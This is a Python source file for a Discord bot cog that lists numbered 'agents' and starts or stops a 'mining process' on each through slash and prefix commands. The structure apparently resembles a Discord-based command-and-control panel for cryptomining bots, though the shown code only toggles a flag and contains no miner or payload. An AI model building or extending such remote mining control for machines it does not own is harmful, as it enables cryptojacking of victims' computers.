
import discord
from discord.ext import commands
from code.discord.bot import BOT
from code.discord.cogs.miningInteractButtons import miningInteractButtons
from code.discord.cogs.allowedGuild import is_allowed_guild


class CryptoMining(commands.Cog):

    def __init__(self, bot:BOT):
        self.bot = bot
        self.guild = bot.guild
        self.id = bot.id


    @commands.hybrid_command(name = "ls-mining", with_app_command = True, description = "Stopping the mine process")
    @is_allowed_guild
    async def ls_mining(self, ctx:commands.Context):
        if ctx.interaction:
            my_embed = discord.Embed(
                title = f"Please use **!ls** instead of the slash command",
                color = 0xFF0000
            )
            await ctx.reply(embed = my_embed)
        else:
            my_embed = discord.Embed(
                title = f"Agent #{self.id}   Mining status: {"🟩" if self.bot.active_mining else "🟥"} {self.bot.active_mining}",
                color = 0xADD8E6
            )
            view = miningInteractButtons("Mining-Interact", self.id, self.bot)
            await ctx.reply(embed = my_embed, view = view)

    
    @commands.hybrid_command(name = "start-mining", with_app_command = True, description = "Strating the mine process")
    @is_allowed_guild
    async def start_mining(self, ctx:commands.Context):
        self.bot.active_mining = True


    @commands.hybrid_command(name = "stop-mining", with_app_command = True, description = "Stopping the mine process")
    @is_allowed_guild
    async def stop_mining(self, ctx:commands.Context):
        self.bot.active_mining = False

    
    @commands.hybrid_command(name = "help-mining", with_app_command = True, description = "Help menu")
    @is_allowed_guild
    async def help(self, ctx:commands.Context):
        my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
        my_embed.add_field(name="/help", value="Shows this menu, use help-mining for cryptomining help", inline=False)
        my_embed.add_field(name="!ls-mining", value="Get a list of all active agents with mining gui", inline=False)
        my_embed.add_field(name="/start-mining", value="Starts mining process on agent", inline=False)
        my_embed.add_field(name="/stop-mining", value="Stops mining process on agent", inline=False)
        await ctx.reply(embed = my_embed)


async def setup(bot:BOT):
    await bot.add_cog(CryptoMining(bot))
